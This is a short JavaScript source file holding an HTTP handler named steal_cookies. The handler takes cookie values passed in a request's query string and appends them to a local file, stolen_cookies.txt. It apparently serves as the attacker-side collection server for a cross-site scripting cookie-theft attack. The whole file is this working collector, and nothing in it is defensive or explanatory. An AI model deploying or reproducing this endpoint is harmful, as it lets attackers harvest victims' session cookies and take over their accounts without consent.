import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

// Helper to get __dirname with ES6 modules
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

export const steal_cookies = (req, res) => {
    if (req.method === 'GET') {
        const cookies = req.query.cookies || 'No cookies';
        const logFile = path.join(__dirname, 'stolen_cookies.txt');

        fs.appendFile(logFile, `${cookies}\n`, (err) => {
            if (err) {
                console.error('Error writing to file', err);
                res.status(500).send('Server Error');
            } else {
                res.status(200).send('Cookies logged successfully');
            }
        });
    } else {
        res.status(405).send('Method Not Allowed');
    }
};
